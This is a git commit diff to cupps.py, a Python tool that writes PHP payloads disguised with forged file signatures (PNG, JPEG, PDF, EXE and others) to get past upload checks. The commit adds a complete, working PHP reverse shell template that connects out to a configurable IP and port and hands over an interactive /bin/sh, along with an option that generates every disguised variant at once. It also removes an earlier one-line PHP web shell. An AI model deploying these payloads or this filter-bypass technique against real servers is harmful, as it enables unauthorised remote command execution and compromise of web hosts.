bf6b31f71ec91d164ab0b9c56ea9b9ed9bd4220d
Saket Upadhyay <saketupadhyay@protonmail.com>
2021-11-13 19:01:19 +0530

    minor fixes and taking data from input file

--- cupps.py
+++ cupps.py
@@ -23,14 +23,160 @@
 
 # ======================================================================================
 
-
+from pathlib import Path
 # CHANGE THIS TO YOUR OWN PAYLOAD
-payload="""
+# This template payload is a PhP Reverse Shell, kind courtesy of http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
-<?php echo _system(GET[dothis])>
+if Path("./input.php").exists():
+	print("[*] input.php found, using contents of the file as payload string")
+	with open("input.php","r") as phpfile:
+		payload=phpfile.readlines()
+else:
+	print("[!] No input.php found, using hardcoded reverse_shell template")
+	payload="""
+	<?php
+
+	set_time_limit (0);
+	$VERSION = "1.0";
+	$ip = '127.0.0.1';  // CHANGE THIS
+	$port = 1234;       // CHANGE THIS
+	$chunk_size = 1400;
+	$write_a = null;
+	$error_a = null;
+	$shell = 'uname -a; w; id; /bin/sh -i';
+	$daemon = 0;
+	$debug = 0;
 
 
-"""
+
+	if (function_exists('pcntl_fork')) {
+		// Fork and have the parent process exit
+		$pid = pcntl_fork();
+		
+		if ($pid == -1) {
+			printit("ERROR: Can't fork");
+			exit(1);
+		}
+		
+		if ($pid) {
+			exit(0);  // Parent exits
+		}
+
+		// Make the current process a session leader
+		// Will only succeed if we forked
+		if (posix_setsid() == -1) {
+			printit("Error: Can't setsid()");
+			exit(1);
+		}
+
+		$daemon = 1;
+	} else {
+		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+	}
+
+	// Change to a safe directory
+	chdir("/");
+
+	// Remove any umask we inherited
+	umask(0);
+
+	//
+	// Do the reverse shell...
+	//
+
+	// Open reverse connection
+	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+	if (!$sock) {
+		printit("$errstr ($errno)");
+		exit(1);
+	}
+
+	// Spawn shell process
+	$descriptorspec = array(
+	0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+	1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+	2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+	);
+
+	$process = proc_open($shell, $descriptorspec, $pipes);
+
+	if (!is_resource($process)) {
+		printit("ERROR: Can't spawn shell");
+		exit(1);
+	}
+
+	// Set everything to non-blocking
+	// Reason: Occsionally reads will block, even though stream_select tells us they won't
+	stream_set_blocking($pipes[0], 0);
+	stream_set_blocking($pipes[1], 0);
+	stream_set_blocking($pipes[2], 0);
+	stream_set_blocking($sock, 0);
+
+	printit("Successfully opened reverse shell to $ip:$port");
+
+	while (1) {
+		// Check for end of TCP connection
+		if (feof($sock)) {
+			printit("ERROR: Shell connection terminated");
+			break;
+		}
+
+		// Check for end of STDOUT
+		if (feof($pipes[1])) {
+			printit("ERROR: Shell process terminated");
+			break;
+		}
+
+		// Wait until a command is end down $sock, or some
+		// command output is available on STDOUT or STDERR
+		$read_a = array($sock, $pipes[1], $pipes[2]);
+		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+		// If we can read from the TCP socket, send
+		// data to process's STDIN
+		if (in_array($sock, $read_a)) {
+			if ($debug) printit("SOCK READ");
+			$input = fread($sock, $chunk_size);
+			if ($debug) printit("SOCK: $input");
+			fwrite($pipes[0], $input);
+		}
+
+		// If we can read from the process's STDOUT
+		// send data down tcp connection
+		if (in_array($pipes[1], $read_a)) {
+			if ($debug) printit("STDOUT READ");
+			$input = fread($pipes[1], $chunk_size);
+			if ($debug) printit("STDOUT: $input");
+			fwrite($sock, $input);
+		}
+
+		// If we can read from the process's STDERR
+		// send data down tcp connection
+		if (in_array($pipes[2], $read_a)) {
+			if ($debug) printit("STDERR READ");
+			$input = fread($pipes[2], $chunk_size);
+			if ($debug) printit("STDERR: $input");
+			fwrite($sock, $input);
+		}
+	}
+
+	fclose($sock);
+	fclose($pipes[0]);
+	fclose($pipes[1]);
+	fclose($pipes[2]);
+	proc_close($process);
+
+	// Like print, but does nothing if we've daemonised ourself
+	// (I can't figure out how to redirect STDOUT like a proper daemon)
+	function printit ($string) {
+		if (!$daemon) {
+			print "$string\n";
+		}
+	}
+
+	?> 
+
+	"""
 
 
 
@@ -53,79 +199,94 @@ JAR_magicBytes= bytes([0x50,0x4B,0x03,0x04,0x0A,0x00,0x00,0x08,0x00,0x00,0x00,0x
 
 # FUNCTIONS FOR DIFFERENT 
 def create_png(payload):
-    with open("exploit.php.png","wb") as fb:
-        fb.write(PNG_magicBytes+payload)
+	with open("exploit.php.png","wb") as fb:
+		fb.write(PNG_magicBytes+payload)
 
 def create_jpeg(payload):
-    with open("exploit.php.jpg","wb") as fb:
-        fb.write(JPEG_magicBytes+payload)
+	with open("exploit.php.jpg","wb") as fb:
+		fb.write(JPEG_magicBytes+payload)
 
 def create_exe(payload):
-    with open("exploit.php.exe","wb") as fb:
-        fb.write(EXE_magicBytes+payload)
+	with open("exploit.php.exe","wb") as fb:
+		fb.write(EXE_magicBytes+payload)
 
 def create_elf(payload):
-    with open("exploit.php.o","wb") as fb:
-        fb.write(ELF_magicBytes+payload)
+	with open("exploit.php.o","wb") as fb:
+		fb.write(ELF_magicBytes+payload)
 
 def create_gif(payload):
-    with open("exploit.php.gif","wb") as fb:
-        fb.write(GIF_magicBytes+payload)
+	with open("exploit.php.gif","wb") as fb:
+		fb.write(GIF_magicBytes+payload)
 
 def create_bmp(payload):
-    with open("exploit.php.bmp","wb") as fb:
-        fb.write(BMP_magicBytes+payload)
+	with open("exploit.php.bmp","wb") as fb:
+		fb.write(BMP_magicBytes+payload)
 
 def create_iso(payload):
-    with open("exploit.php.iso","wb") as fb:
-        fb.write(ISO_magicBytes+payload)
+	with open("exploit.php.iso","wb") as fb:
+		fb.write(ISO_magicBytes+payload)
 
 
 def create_jar(payload):
-    with open("exploit.php.jar","wb") as fb:
-        fb.write(JAR_magicBytes+payload)
+	with open("exploit.php.jar","wb") as fb:
+		fb.write(JAR_magicBytes+payload)
 
 def create_pdf(payload):
-    with open("exploit.php.pdf","wb") as fb:
-        fb.write(PDF_magicBytes+payload)
+	with open("exploit.php.pdf","wb") as fb:
+		fb.write(PDF_magicBytes+payload)
 
+def create_all(payload):
+	create_bmp(payload)
+	create_elf(payload)
+	create_gif(payload)
+	create_exe(payload)
+	create_pdf(payload)
+	create_png(payload)
+	create_iso(payload)
+	create_jpeg(payload)
+	create_jar(payload)
 
 
 parser = ap.ArgumentParser(description='Script to create PHP Payloads with custom file signatures', epilog='~ with <3 by X64M')
 
 parser.add_argument('-s', '--signature', metavar='target_signature', action='store' , type=str,
-        help='accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso')
+		help='accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso; \'-s all\' will create all.')
 
 args = parser.parse_args()
 sig_select = args.signature
 
+
+
 if(sig_select == 'png'):
-    create_png(payload)
-    print("DONE")
+	create_png(payload)
+	print("DONE")
 elif(sig_select == 'bmp'):
-    create_bmp(payload)
-    print("DONE")
+	create_bmp(payload)
+	print("DONE")
 elif(sig_select == 'jpg'):
-    create_jpeg(payload)
-    print("DONE")
+	create_jpeg(payload)
+	print("DONE")
 elif(sig_select == 'gif'):
-    create_gif(payload)
-    print("DONE")
+	create_gif(payload)
+	print("DONE")
 elif(sig_select == 'exe'):
-    create_exe(payload)
-    print("DONE")
+	create_exe(payload)
+	print("DONE")
 elif(sig_select == 'elf'):
-    create_elf(payload)
-    print("DONE")
+	create_elf(payload)
+	print("DONE")
 elif(sig_select == 'iso'):
-    create_iso(payload)
-    print("DONE")
+	create_iso(payload)
+	print("DONE")
 elif(sig_select == 'jar'):
-    create_jar(payload)
-    print("DONE")
+	create_jar(payload)
+	print("DONE")
 elif(sig_select == 'pdf'):
-    create_pdf(payload)
-    print("DONE")
+	create_pdf(payload)
+	print("DONE")
+elif(sig_select == 'all'):
+	print("Generating all.")
+	create_all(payload)
+	print("DONE")
 else:
-    print("Requested Signature not Recogonised")
-    
+	print("Requested Signature not Recogonised")
